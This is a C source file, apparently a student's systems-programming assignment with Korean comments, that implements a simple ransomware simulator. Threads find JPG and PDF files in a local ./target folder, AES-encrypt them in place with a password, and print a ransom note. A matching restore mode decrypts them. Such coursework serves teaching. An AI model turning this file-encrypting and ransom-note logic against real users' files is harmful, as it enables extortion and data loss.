#include <stdio.h>
#include <pthread.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include "crypto.h"
#include "utils.h"
#include "threadpool.h"
//최지은 32214689


void *attack(void *param); // attack 함수 선언
void *restore(void *param); // restore 함수 선언
int ext(PINFO param); // 확장자 추출 함수 선언
char *upper(char *param); // 문자열 -> 대문자 함수 선언

int main(int argc, char **argv)
{
    if (argc != 3 || (strcmp("attack", argv[1]) != 0 && strcmp("restore", argv[1]) != 0))
    {
        printf("ERROR");
        return 0;
    } // 인자, 개수 != 3, (attack, restore) 아닐 경우 -> 종료

    void *(*f)(void *); // 함수 포인터 f선언

    if (strcmp("attack", argv[1]) == 0) // argv[1]에 따라 함수 포인터 매핑
        f = attack;
    else
        f = restore;

    pthread_t Jpg_Id; // jpg 스레드 id
    pthread_t Pdf_Id; // pdf 스레드 id

    // initialize the thread pool
    pool_init();

    INFO J = {0, }; // 구조체 J(JPG 스레드 함수 매개변수) 선언, 초기화
    INFO P = {0, }; // 구조체 P(PDF 스레드 함수 매개변수) 산안, 초기화

    strcpy(J.password, argv[2]); // J.password에 argv[2] 복사
    strcpy(P.password, argv[2]); // P.password에 argv[2] 복사
    strcpy(J.SIG, ".JPG"); // J.SIG에 ".JPG" 복사
    strcpy(P.SIG, ".PDF"); // P.SIG에 "PDF" 복사

    PINFO PJ = &J; // 구조체 포인터 선언 J 주소 할당 (J 포인터)
    PINFO PP = &P; // 구조체 포인터 선언 P 주소 할당 (P 포인터)

    pthread_create(&Jpg_Id, NULL, f, PJ); // JPG 스레드 생성(시작 루틴 : f, 매개변수 : PJ(구조체 J 포인터))
    pthread_create(&Pdf_Id, NULL, f, PP); // PDF 스레드 생성(시작 루틴 : f, 매개변수 : PP(구조체 P 포인터))


    pthread_join(Jpg_Id, NULL); // JPG 스레드 종료
    pthread_join(Pdf_Id, NULL); // PDF 스레드 종료 

    if (f == attack) // attack 함수일 경우 출력
    {
        printf("[attack] %d jpg files were encrypted\n", PJ -> sum);
        printf("[attack] %d pdf files were encrypted", PP -> sum);
        // 암호화 성공 파일 개수 출력

        if (PJ -> sum > 0 || PP -> sum > 0) // 암호화 하나라도 성공시
            print("./note_enc.txt");
        // print함수 호출 -> 랜섬 노트 출력
    }

    else if (f == restore) // restore 함수일 경우 출력
    {
        printf("[restore] %d jpg files were decrypted\n", PJ -> sum);
        printf("[restore] %d pdf files were decrypted", PP -> sum);
        // 복호화 성공 파일 개수 출력

        if (PJ -> sum > 0 || PP -> sum > 0) // 복호화 하나라도 성공시
            print("./note_dec.txt");
        // print함수 호출 -> 랜섬 노트 출력
    }
    
    sleep(5);
    pool_shutdown();

    return 0;
}

void *attack(void *param) // attack 함수
{
    PINFO P = param; // void *형 매개변수 -> 구조체 *형으로 변경(PJ -> P, PP -> P)


    if (ext(P) == 1) // 확장자 추출 힘수 호출(구조체 P(PJ, PP))
    {
        printf("파일 읽기 실패\n"); // 디렉토리 조회 실패시 -> 종료
        return NULL;
    }
    
    aes_128_encrypt(P); // 

    for (int i = 0; i < P -> sum; i++)
    {
        fclose(P -> fpArr[i]);
    }

    free(P -> fileName);
    free(P -> fpArr);

    return NULL;
}

void *restore(void *param)
{
    PINFO P = param;

    ext(P);

    aes_128_decrypt(P);

    for (int i = 0; i < P -> sum; i++)
    {
        fclose(P -> fpArr[i]);
    }

    free(P -> fileName);
    free(P -> fpArr);
    
    return NULL;
}


int ext(PINFO param) // 확장자 추출 함수
{
    DIR *dp; // 디렉토리 포인터 선언
    struct dirent *dir; // 디렉토리 조회 구조체 포인터 선언

    // 각 파일 포인터 배열 선언을 위한 각 파일 개수 세기 

    if ((dp = opendir("./target")) == NULL) // 디렉토리 열기 실패 -> 종료
        return 1;

    while ((dir = readdir(dp)) != NULL) // 디렉토리 읽기 반복
    {
        char *temp = upper(dir -> d_name); // temp <- upper(파일 이름) 반환 값 할당

        if (strstr(temp, param -> SIG) != NULL) // 구조체.시그니처(".JPG" or "./PDF")가 temp에 있을 경우
            param -> sum++; // 각 구조체.sum + 1
        
        free(temp);
    }

    closedir(dp);

    // 각 파일 개수만큼 (파일 포인터 배열, 파일 이름 배열) 공간 할당

    param -> fpArr = (FILE **)malloc(sizeof(FILE *) * param -> sum + 1); // 파일 포인터 배열
    param -> fileName = (char **)malloc(sizeof(char *) * param -> sum + 1); // 파일 이름 배열
    
    // JPG, PDF 조회 -> 각 구조체에 각각 (파일 포인터, 파일 이름) 할당
    
    int idx = 0;

    dp = opendir("./target"); // 디렉토리 오픈

    while ((dir = readdir(dp)) != NULL) // 디렉토리 조회
    {
        char *temp = upper(dir -> d_name); // temp에 upper 반환 값(대문자 파일 이름) 할당

        if (strstr(temp, param -> SIG) != NULL) // temp(대문자 파일 이름)에 구조체의 시그니
        {
            char *path = (char *)malloc(sizeof(char) * (strlen(dir -> d_name) + strlen("./target/") + 1));
            
            strcpy(path, "./target/");
            strcat(path, dir -> d_name);
            
            param -> fileName[idx] = dir -> d_name;
            param -> fpArr[idx] = fopen(path, "r+b");
            
            free(path);
            idx++;
        }

        free(temp);
    }

    return 0;
}

char *upper(char *param) // 대문자 함수 선언
{
    char *temp = (char *)malloc(sizeof(char) * strlen(param) + 1); // 대문자 문자열 저장 공간
    
    memset(temp, 0, strlen(param) + 1); // temp 초기화

    for (int i = 0; i < strlen(param); i++) // 매개변수(파일 이름) 개수 만큼 대문자 변경
    {
        if (param[i] >= 'a' && param[i] <= 'z') // 소문자일 경우
        {
            temp[i] = param[i] - 32; // 대문자로 변경해서 temp[i[에 저장
            continue;
        }

        temp[i] = param[i]; // 소문자 외에 그대로 입력
    }

    return temp; // temp(대문자 파일 이름) 반환
}